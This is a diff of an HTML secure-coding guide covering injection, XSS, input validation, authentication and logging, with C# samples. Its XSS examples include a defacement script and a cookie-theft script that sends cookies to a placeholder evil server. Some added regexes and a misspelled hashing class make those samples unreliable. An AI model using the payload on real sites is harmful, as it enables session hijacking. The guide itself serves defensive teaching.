@@ -749,6 +749,7 @@
                                                             <ul>
                                                                 <li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project" target="_blank">OWASP Application Security Verification Standard Project</a></li>
                                                                 <li><a href="https://www.owasp.org/index.php/OWASP_Testing_Project" target="_blank">OWASP Testing Guide</a></li>
+                                                                <li><a href="https://www.checkmarx.com/resources/white-papers/" target="_blank">Checkmarx Whitepaper collection</a></li>
                                                             </ul>
                                                         </div>
                                                     </div>
@@ -766,6 +767,8 @@
                                                             <h2>Parameterize Queries</h2>
                                                         </div>
                                                         <div class="bp-body">
+                                                                <p>Injection flaws, such as SQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the 
+                                                                        interpreter into executing unintended commands or accessing unauthorised data. </p>
                                                             <p>SQL injection is one of the most dangerous application risks, partly because attackers can use open source attack tools to exploit these common vulnerabilities.
                                                                 You can control this risk using query parameterization. This type of query specifies placeholders for parameters, so the database will always treat them as data, rather
                                                                 than part of a SQL command. You can use prepared statements, and a growing number of frameworks, including Rails, Django, and Node.js, use object relational
@@ -774,10 +777,17 @@
                                                             <hr>
                                                             <h3>GUIDANCE</h3>
                                                             <ul class="checkItem">
+                                                                <li>All input should be validated against a whitelist of acceptable value ranges.</li>
                                                                 <li>Parameterize the queries by binding the variables.</li>
                                                                 <li>Be cautious about allowing user input into object queries (OQL/HQL) or other advanced queries supported by the framework.</li>
-                                                                <li>Defend against SQL injection using proper database management system configuration.</li>
+                                                                <li>Defend against SQL injection using proper database management system configuration - Principle of Least Privilege.</li>
                                                             </ul>
+                                                            <hr>
+                                                            <h5>THOUGHTS</h5>
+                                                            <p>Sql Injection, although not as common as Cross-Site-Scripting, poses a significantly higher risk because any compromise here can open up more than just the current user session. 
+                                                                With Sql Injection attacks, hi-jacked data and can be stored at the database level to compromise EVERY user of the system.
+                                                            </p>
+                                                            <p></p>
                                                             <hr>
                                                             <h3>EXAMPLES</h3>
                                                             <p>Here is an example of query parametization in C#:</p>
@@ -815,6 +825,8 @@ pstmt.<span style="color: #658b00">setInt</span>(<span style="color: #B452CD">2<
                                                             <h2>Encode Data</h2>
                                                         </div>
                                                         <div class="bp-body">
+                                                            <p>XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation and escaping. XSS allows attackers to execute scripts in the victim’s 
+                                                                browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.</p>
                                                             <p>Encoding translates potentially dangerous special characters into an equivalent form that renders the threat ineffective. This technique is applicable for a
                                                                 variety of platforms and injection methods, including UNIX command encoding, Windows command encoding, and cross-site scripting (XSS). Encoding
                                                                 addresses the three main classes of XSS: persistent, reflected, and DOM-based
@@ -822,9 +834,10 @@ pstmt.<span style="color: #658b00">setInt</span>(<span style="color: #B452CD">2<
                                                             <hr>
                                                             <h3>GUIDANCE</h3>
                                                             <ul class="checkItem">
-                                                                <li>Treat all data as untrusted, including dynamic content consisting of a mix of static, developer-built HTML/JavaScript, and data that was originally
+                                                                <li><b>Treat all data as untrusted</b>, including dynamic content consisting of a mix of static, developer-built HTML/JavaScript, and data that was originally
                                                                     populated with user input</li>
-                                                                <li>Develop relevant encoding to address the spectrum of attack methods, including injection attacks.</li>
+                                                                <li>Always use request validation, unless there is an approved reason to have it turned off.  For example, unless explicitly turned off, all ASP.NET web apps will look for potentially malicious input and throw an HTTP 500 error if detected.</li>
+                                                                <li>Develop relevant encoding (whitelisting inputs) to address the spectrum of attack methods, including injection attacks. In .NET the HtmlEncode functionality and the AntiXSS libraries are a great starting point.</li>
                                                                 <li>Use output encoding, such as JavaScript hex encoding and HTML entity encoding. </li>
                                                                 <li>Monitor how dynamic webpage development occurs, and consider how JavaScript and HTML populate user input, along with the risks
                                                                     of untrusted sources.</li>
@@ -842,7 +855,7 @@ pstmt.<span style="color: #658b00">setInt</span>(<span style="color: #B452CD">2<
                                                             <hr>
                                                             <h3>EXAMPLES - Cross Site Scripting</h3>
                                                             <p>This is a common example of a common XSS site defacement</p>
-<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #8B008B; font-weight: bold">&lt;script&gt;</span><span style="color: #658b00">document</span>.body.innerHTML(<span style="color: #CD5555">&quot;Jim was here&quot;</span>);<span style="color: #8B008B; font-weight: bold">&lt;/script&gt;</span>
+<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #8B008B; font-weight: bold">&lt;script&gt;</span><span style="color: #658b00">document</span>.body.innerHTML(<span style="color: #CD5555">&quot;Jerry was here&quot;</span>);<span style="color: #8B008B; font-weight: bold">&lt;/script&gt;</span>
 </pre></div>
                                                             <p>Example XSS session theft</p>
 <div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #8B008B; font-weight: bold">&lt;script&gt;</span>
@@ -851,13 +864,31 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
 <span style="color: #8B008B; font-weight: bold">&lt;/script&gt;</span>
 </pre></div>
                                                             <p>The good news is that despite how common these attacks are, they are relativly easy to defend against.  Most languages provide a built-in mechansim to support html encoding for inputs - and they should <b>ALWAYS</b> be used.</p>
+                                                            <p>If you happen to be using a Microsoft .NET, by default, MVC rejects requests containing HTML markup to prevent Cross-Site Scripting attacks and this is one advantage of MVC since if you forgot to work on XSS preventions then you still win; however, do NOT 
+                                                                    rely on this as your sole means of protection.</p>
+                                                                    <br>
+<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 20px; line-height: 125%"><span style="color: #228B22">// input encoding sample</span>
+<span style="color: #a7a7a7; font-weight: bold">var</span> newUrl = Request.QueryString[<span style="color: #CD5555">&quot;Url&quot;</span>]; 
+<span style="color: #8B008B; font-weight: bold">if</span> (!Uri.IsWellFormedUriString(newUrl, UriKind.Absolute)) 
+{
+    log.warning(<span style="color: #CD5555">&quot;An invalid URL has been specified.&quot;</span>);   
+    <span style="color: #8B008B; font-weight: bold">return</span>;
+}
+...
 
+<span style="color: #228B22">// output encoding sample</span>
+<span style="color: #a7a7a7; font-weight: bold">var</span> name = AntiXss.JavaScriptEncode(txtName.Text, <span style="color: #8B008B; font-weight: bold">false</span>); 
+<span style="color: #a7a7a7; font-weight: bold">var</span> message = <span style="color: #CD5555">&quot;Thank you &quot;</span> + name; 
+<span style="color: #a7a7a7; font-weight: bold">var</span> alertScript = <span style="color: #CD5555">&quot;&lt;script&gt;alert(&#39;&quot;</span> + message + <span style="color: #CD5555">&quot;&#39;);&lt;/script&gt;&quot;</span>; 
+ClientScript.RegisterClientScriptBlock(GetType(), <span style="color: #CD5555">&quot;ThankYou&quot;</span>, alertScript); 
+</pre></div>
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
                                                             <ul>
                                                                 <li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank">OWASP XSS Filter Evasion Cheat Sheet</a></li>
                                                                 <li><a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet" target="_blank">OWASP DOM based XSS Prevention Cheat Sheet</a></li>
                                                                 <li><a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.httpserverutility.htmlencode?view=netframework-4.7.2" target="_blank">HTMLEncode for.NET framework</a></li>
+                                                                <li><a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.security.antixss.antixssencoder?view=netframework-4.7.2" target="_blank">Microsoft AntiXss Library</a></li>
                                                             </ul>
                                                         </div>
                                                     </div>
@@ -894,15 +925,35 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                             </ul>
                                                             <hr>
                                                             <h3>THOUGHTS</h3>
-                                                            <p></p>
+                                                            <p>You'll notice that this item, Input Validation, also appears as parts of the other standards for security.  This is an example of Defense-In-Depth.  No single 
+                                                                method provides 100% safety; however, combined, they can lower the risk significantly.</p>
                                                             <hr>
-                                                            <h3>EXAMPLES - Validating Emails</h3>
-                                                            <p></p>
+                                                            <h3>EXAMPLES - Validating Common Types with Regular Expressions</h3>
+                                                            <p>Here are some basic validations based on Regular Expressions that you could use:</p>
+<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 20px; line-height: 125%"><span style="color: #a7a7a7; font-weight: bold">var</span> firstname = Request.QueryString[<span style="color: #CD5555">&quot;firstname&quot;</span>];
+
+<span style="color: #a7a7a7; font-weight: bold">var</span> positiveRealNumberGreaterThanZeroRegex = <span style="color: #8B008B; font-weight: bold">new</span> Regex(<span style="color: #CD5555">@&quot;^[0-9]*[1-9]+[0-9]*\.[0-9]*$)|(^[0-9]*\.[0-9]*[1-9]+[0-9]*$)|(^[0-9]*[1-9]+[0-9]*$)&quot;</span>); 
+<span style="color: #a7a7a7; font-weight: bold">var</span> properNameRegex = <span style="color: #8B008B; font-weight: bold">new</span> Regex(<span style="color: #CD5555">@&quot;^([a-zA-Z]{2,}\s[a-zA-z]{1,}&#39;?-?[a-zA-Z]{2,}\s?([a-zA-Z]{1,})?)&quot;</span>);
+<span style="color: #a7a7a7; font-weight: bold">var</span> zipcodeRegex = <span style="color: #8B008B; font-weight: bold">new</span> Regex(<span style="color: #CD5555">@&quot;[0-9]\{5\}(-[0-9]\{4\})?&quot;</span>);
+<span style="color: #a7a7a7; font-weight: bold">var</span> emailRegex = <span style="color: #8B008B; font-weight: bold">new</span> Regex(<span style="color: #CD5555">@&quot;/^([a-z0-9_\.-]+)@([\da-z\.-]+)\.([a-z\.]{2,6})$&quot;</span>);
+<span style="color: #a7a7a7; font-weight: bold">var</span> golubEmailRegex = <span style="color: #8B008B; font-weight: bold">new</span> Regex(<span style="color: #CD5555">@&quot;/^([\w-\.]+@(?!golubcapital.com)([\w- ]+\.)+[\w-]{2,4})?$/&quot;</span>);
+
+<span style="color: #228B22">// if the supplied values are not in the whitelist, reject the query immediately</span>
+<span style="color: #8B008B; font-weight: bold">if</span>(!golubEmailRegex.IsMatch(email))
+{   
+    log.warning(<span style="color: #CD5555">&quot;An invalid or non-golub email has been specified.&quot;</span>);   
+    <span style="color: #8B008B; font-weight: bold">return</span>; 
+}
+</pre></div>
+        
+                                                            <br>
+                                                                
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
                                                             <ul>
                                                                 <li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project" target="_blank">OWASP Application Security Verification Standard Project</a></li>
                                                                 <li><a href="https://www.owasp.org/index.php/OWASP_Testing_Project" target="_blank">OWASP Testing Guide</a></li>
+                                                                <li><a href="http://regexlib.com/?AspxAutoDetectCookieSupport=1" target="_blank">Regular Expression Library</a></li>
                                                             </ul>
                                                         </div>
                                                     </div>
@@ -917,7 +968,7 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                     <div class="best-practices-block">
                                                         <div class="bp-header">
                                                             <div class="id">5</div>
-                                                            <h2>Implement Identify and Authentication Controls</h2>
+                                                            <h2>Implement Identity and Authentication Controls</h2>
                                                         </div>
                                                         <div class="bp-body">
                                                             <p>You can avoid security breaches by confirming user identity up front and building strong authentication controls into code and systems. These controls
@@ -927,17 +978,23 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                             <hr>
                                                             <h3>GUIDANCE</h3>
                                                             <ul class="checkItem">
-                                                                <li>Use strong authentication methods, including multi-factor authentication,  such as FIDO or dedicated apps.</li>
-                                                                <li>Consider biometric authentication methods, such as fingerprint, facial recognition, and voice recognition, to verify the identity of users. </li>
-                                                                <li>Implement secure password storage. </li>
-                                                                <li>Implement a secure password recovery mechanism to help users gain access to their account if they forget their password.</li>
-                                                                <li>Establish timeout and inactivity periods for every session.</li>
+                                                                <li>Use strong authentication methods, including multi-factor authentication,  such as FIDO, dedicated apps, or Windows Authentication.</li>
+                                                                <li>Implement secure password requirements and storage - never store passwords in plain text, even if the database is encrypted. <i>Not really applicable when using Windows Auth.</i></li>
+                                                                <li>Implement a secure password recovery mechanism to help users gain access to their account if they forget their password.  Enable password recovery via resets - never email it. Doing 
+                                                                    password recovery wrong is a recipe for disaster; it could literally serve up credentials to an attacker on a silver platter. <i>Not really applicable when using Windows Auth.</i></li>
+                                                                <li>Ensure that all back-end services support only authenticated requests.</li>
+                                                                <li>Establish explicit timeout and inactivity periods for every session.</li>
                                                                 <li>Use re-authentication for sensitive or highly secure features.</li>
+                                                                <li>Use only secure sesion management.</li>
                                                                 <li>Use monitoring and analytics to spot suspicious IP addresses and machine IDs.</li>
+                                                                <li>Consider biometric authentication methods, such as fingerprint, facial recognition, and voice recognition, to verify the identity of users.<sup>*</sup> </li>
                                                             </ul>
                                                             <hr>
-                                                            <h3>EXAMPLES - Password hashing</h3>
-                                                            <p></p>
+                                                            <h3>THOUGHTS</h3>
+                                                            <p>Your users are entering their password into your website or application. They are trusting you with their security. If your database gets hacked, and your users' 
+                                                                passwords are unprotected, then malicious hackers can use those passwords to compromise your users' accounts on other websites and services (most 
+                                                                people use the same password everywhere). It's not just your security that's at risk, it's your users'. You are responsible for your users' security.</p>
+                                                            <hr>
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
                                                             <ul>
@@ -979,7 +1036,50 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                                     state, user entitlements, overall access control policy, the feature and data requested, along with time and geolocation.</li>
                                                             </ul>
                                                             <hr>
+                                                            <h3>THOUGHTS</h3>
+                                                            <p>Here, my recommendation diverges from the OWASP standard.  In the OWASP standard, they recommend preferring access checks be done at the individual rather than the role of AD group level.  
+                                                                In theory, they are correct; however, in practice, this approach becomes extremely unwieldy very quickly and requires complex and nearly real-time updates to code or your Authentication 
+                                                                provider to support this behavior.  
+                                                            </p>
+                                                            <hr>
                                                             <h3>EXAMPLES - Coding to Activity</h3>
+                                                            <p>Here are some examples using the [Authorize] attribute in C# with WebAPI.</p>
+<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 20px; line-height: 125%"><span style="color: #8B008B; font-weight: bold">public</span> <span style="color: #8B008B; font-weight: bold">static</span> <span style="color: #8B008B; font-weight: bold">void</span> <span style="color: #008b45">Register</span>(HttpConfiguration config)
+{
+    config.Filters.Add(<span style="color: #8B008B; font-weight: bold">new</span> AuthorizeAttribute());
+}
+
+<span style="color: #228B22">// Require authorization for all actions on the controller.</span>
+<span style="color: #658b00">[Authorize]</span>
+<span style="color: #8B008B; font-weight: bold">public</span> <span style="color: #8B008B; font-weight: bold">class</span> <span style="color: #008b45; font-weight: bold">ValuesController</span> : ApiController
+{
+    <span style="color: #8B008B; font-weight: bold">public</span> HttpResponseMessage <span style="color: #008b45">Get</span>(<span style="color: #a7a7a7; font-weight: bold">int</span> id) { ... }
+    <span style="color: #8B008B; font-weight: bold">public</span> HttpResponseMessage <span style="color: #008b45">Post</span>() { ... }
+}
+
+<span style="color: #228B22">// authorizing only a specific action</span>
+<span style="color: #8B008B; font-weight: bold">public</span> <span style="color: #8B008B; font-weight: bold">class</span> <span style="color: #008b45; font-weight: bold">ValuesController</span> : ApiController
+{
+    <span style="color: #8B008B; font-weight: bold">public</span> HttpResponseMessage <span style="color: #008b45">Get</span>() { ... }
+
+    <span style="color: #228B22">// Require authorization for a specific action.</span>
+<span style="color: #658b00">    [Authorize]</span>
+    <span style="color: #8B008B; font-weight: bold">public</span> HttpResponseMessage <span style="color: #008b45">Post</span>() { ... }
+}
+
+<span style="color: #228B22">// Restrict by user:</span>
+<span style="color: #658b00">[Authorize(Users=&quot;Alice,Bob&quot;)]</span>
+<span style="color: #8B008B; font-weight: bold">public</span> <span style="color: #8B008B; font-weight: bold">class</span> <span style="color: #008b45; font-weight: bold">ValuesController</span> : ApiController
+{
+}
+   
+<span style="color: #228B22">// Restrict by role:</span>
+<span style="color: #658b00">[Authorize(Roles=&quot;Administrators&quot;)]</span>
+<span style="color: #8B008B; font-weight: bold">public</span> <span style="color: #8B008B; font-weight: bold">class</span> <span style="color: #008b45; font-weight: bold">ValuesController</span> : ApiController
+{
+}
+</pre></div>
+                                                            <br>
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
                                                             <ul>
@@ -1020,8 +1120,29 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                                 <li>Use transport layer security (TLS) to encrypt data in transit. </li>
                                                             </ul>
                                                             <hr>
-                                                            <h3>EXAMPLES - Cryptographically secure pseudo-random number generator</h3>
-                                                            <p></p>
+                                                            <h3>EXAMPLES - Cryptographically secure password hashing</h3>
+                                                            <p>This is an example of cryptographically secure password hashing in C#.Net.</p>
+<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 20px; line-height: 125%"><span style="color: #228B22">// generate the SALT</span>
+<span style="color: #a7a7a7; font-weight: bold">byte</span>[] salt;
+<span style="color: #8B008B; font-weight: bold">new</span> <span style="color: #008b45">RNGCryptoServiceProvider</span>().GetBytes(salt = <span style="color: #8B008B; font-weight: bold">new</span> <span style="color: #a7a7a7; font-weight: bold">byte</span>[<span style="color: #B452CD">16</span>]);
+
+<span style="color: #228B22">// hash and salt it using PBKDF2 - a slow algorithm</span>
+<span style="color: #a7a7a7; font-weight: bold">var</span> pbkdf2 = <span style="color: #8B008B; font-weight: bold">new</span> Rfc2898DerviceBytes(password, salt, <span style="color: #B452CD">10000</span>);
+
+<span style="color: #228B22">// place the string in the byte array</span>
+<span style="color: #a7a7a7; font-weight: bold">byte</span>[] hash = pbkdf2.GetBytes(<span style="color: #B452CD">20</span>);
+
+<span style="color: #228B22">// make a new byte array to store the hashed password + salt</span>
+<span style="color: #a7a7a7; font-weight: bold">byte</span>[] hashBytes = <span style="color: #8B008B; font-weight: bold">new</span> <span style="color: #a7a7a7; font-weight: bold">byte</span>[<span style="color: #B452CD">36</span>];
+
+<span style="color: #228B22">// place the hash and salt in their respective places</span>
+Array.Copy(salt, <span style="color: #B452CD">0</span>, hashBytes, <span style="color: #B452CD">0</span>, <span style="color: #B452CD">16</span>);
+Array.Copy(hash, <span style="color: #B452CD">0</span>, hashBytes, <span style="color: #B452CD">16</span>, <span style="color: #B452CD">20</span>);
+
+<span style="color: #228B22">// now convert into a string for eventual storage</span>
+<span style="color: #a7a7a7; font-weight: bold">string</span> savedPasswordHash = Convert.ToBase64String(hashBytes);
+</pre></div>
+                                                            <br>
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
                                                             <ul>
@@ -1058,13 +1179,11 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                                 <li>Use an extensible logging framework like Serilog, or Apache Log4j2 / Log4net, to ensure that all log entries are consistent.</li>
                                                                 <li>Keep various audit and transaction logs separate for both security and auditing purposes.</li>
                                                                 <li>Always log the timestamp and identifying information, like source IP and user ID.</li>
+                                                                <li>Log all instances where inappropriate inputs are provided.</li>
                                                                 <li>Don’t log opt-out data, session IDs, or hash value of passwords, or sensitive or private data including credit card or Social Security numbers. </li>
                                                                 <li>Perform encoding on untrusted data before logging it to protect from log injection, also referred to as log forging.</li>
                                                                 <li>Log at an optimal level. Too much or too little logging heightens risk.</li>
                                                             </ul>
-                                                            <hr>
-                                                            <h3>EXAMPLES - Mobile Logging</h3>
-                                                            <p></p>
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
                                                             <ul>
@@ -1134,10 +1253,8 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                                     correctly handled inside the application.</li>
                                                                 <li>Confirm that error messages sent to users aren't susceptible to critical data leaks, and that exceptions are logged in a way that delivers enough information
                                                                     for QA, forensics, or incident response teams to understand the problem.</li>
+                                                                <li>Always turn custom Errors mode on for Web Applications to prevent showing the "yellow screen of death" and thus unintentionally providing information leakae about the application.</li>
                                                             </ul>
-                                                            <hr>
-                                                            <h3>EXAMPLE - Information Leakage</h3>
-                                                            <p></p>
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
                                                             <ul>
@@ -1155,7 +1272,7 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                 <div class="sqs-block-content">
                                                     <h2>Additional Resources</h2>
                                                     <p>There are countless articles from both vendors and thought leaders on what are logging best practices and which framework you should be using.  I prefer to keep it simple and 
-                                                        focus only on things that are universal.  The answer as to which frameworkto use and what your exact standards should be are really a matter for your team to decide.  After all,
+                                                        focus only on things that are universal.  The answer as to which framework to use and what your exact standards should be are really a matter for your team to decide.  After all,
                                                         they understand their needs bettwe than anyone else.  Just make sure that it is uniformly applied.
                                                     </p>
                                                     <ul style="list-style: none">
